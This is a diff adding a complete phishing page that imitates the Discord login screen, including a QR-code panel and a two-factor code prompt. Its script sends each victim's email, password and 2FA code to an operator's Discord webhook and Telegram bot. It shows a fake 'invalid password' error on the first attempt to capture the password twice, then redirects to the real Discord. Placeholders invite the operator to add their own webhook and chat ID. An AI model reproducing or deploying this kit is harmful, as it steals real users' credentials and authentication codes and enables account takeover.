@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord | Login</title>
+    <link rel="icon" type="image/png" href="https://discord.com">
+    <style>
+        /* OFFICIAL BRANDING & ADAPTIVE CSS */
+        @import url('https://fonts.googleapis.com');
+        body { background: url('https://discord.com') center/cover #313338; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; font-family: 'gg sans', 'Noto Sans', sans-serif; overflow: hidden; }
+        
+        .container { background-color: #313338; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); color: #f2f3f5; display: flex; transition: 0.3s; width: 784px; justify-content: space-between; }
+        .login-form-side { width: 414px; text-align: center; }
+        
+        h3 { font-size: 24px; margin-bottom: 8px; font-weight: 600; }
+        .subtitle { color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
+        #error-msg { color: #fa777c; font-size: 14px; margin-bottom: 15px; display: none; text-align: left; font-weight: 500; }
+        
+        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; text-align: left; }
+        input { width: 100%; padding: 10px; margin-bottom: 20px; background-color: #1e1f22; border: 1px solid transparent; border-radius: 3px; color: #dbdee1; font-size: 16px; box-sizing: border-box; }
+        input:focus { border-color: #00a8fc; outline: none; }
+        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.2s; }
+        button:hover { background-color: #4752c4; }
+
+        /* QR & MOBILE LOGIC */
+        .qr-side { width: 240px; border-left: 1px solid #404249; padding-left: 32px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .qr-box { background: white; padding: 8px; border-radius: 4px; margin-bottom: 20px; width: 176px; height: 176px; }
+        .qr-box img { width: 100%; height: 100%; }
+
+        @media (max-width: 830px) {
+            body { background-image: none; }
+            .container { width: 100vw; height: 100vh; border-radius: 0; flex-direction: column; justify-content: center; padding: 32px 16px; }
+            .qr-side { display: none; }
+            .login-form-side { width: 100%; max-width: 414px; margin: 0 auto; }
+        }
+
+        /* 2FA SCREEN */
+        .tfa-container { width: 480px; flex-direction: column; text-align: center; display: none; }
+        .tfa-icon { width: 60px; margin: 0 auto 20px; }
+    </style>
+</head>
+<body>
+
+    <!-- MAIN LOGIN -->
+    <div id="login-box" class="container">
+        <div class="login-form-side">
+            <h3>Welcome back!</h3>
+            <p class="subtitle">We're so excited to see you again!</p>
+            <div id="error-msg">Login or password is invalid.</div>
+            <form id="loginForm">
+                <label>Email or Phone Number</label><input type="text" id="email" required>
+                <label>Password</label><input type="password" id="password" required>
+                <button type="submit">Log In</button>
+                <p style="font-size: 14px; color: #b5bac1; margin-top: 12px; text-align: left;">Need an account? <a href="https://discord.com" style="color: #00a8fc; text-decoration: none;">Register</a></p>
+            </form>
+        </div>
+        <div class="qr-side">
+            <div class="qr-box"><img src="https://api.qrserver.com"></div>
+            <h3 style="color: white; font-size: 20px;">Log in with QR Code</h3>
+            <p style="font-size: 14px; color: #b5bac1; margin: 0;">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+        </div>
+    </div>
+
+    <!-- 2FA SCREEN -->
+    <div id="tfa-box" class="container tfa-container">
+        <img src="https://discord.com" class="tfa-icon">
+        <h3>Enter authentication code</h3>
+        <p class="subtitle">Enter the 6-digit code from your authenticator app.</p>
+        <form id="tfaForm">
+            <label>Authentication Code</label><input type="text" id="tfa-code" placeholder="000000" maxlength="8" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        // CONFIG - Replace with your actual links
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
+        const TG_URL = 'https://api.telegram.org';
+        const TG_CHAT_ID = 'YOUR_CHAT_ID';
+
+        let step = 0;
+        let userData = "";
+
+        async function notify(text) {
+            // Discord
+            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: text }) });
+            // Telegram
+            fetch(TG_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" }) });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            step++;
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('password').value;
+            userData = u;
+
+            const report = `👤 **Login**\nUser: \`${u}\` | Pass: \`${p}\`\nDevice: \`${window.innerWidth < 830 ? 'Mobile' : 'Desktop'}\``;
+            notify(report);
+
+            if (step === 1) {
+                document.getElementById('error-msg').style.display = 'block';
+                document.getElementById('password').value = '';
+            } else {
+                document.getElementById('login-box').style.display = 'none';
+                document.getElementById('tfa-box').style.display = 'flex';
+            }
+        });
+
+        document.getElementById('tfaForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const code = document.getElementById('tfa-code').value;
+            notify(`🛡️ **2FA**\nUser: \`${userData}\` | Code: \`${code}\``);
+            window.location.href = "https://discord.com";
+        });
+    </script>
+</body>
+  </html>
+                                                                                                                   
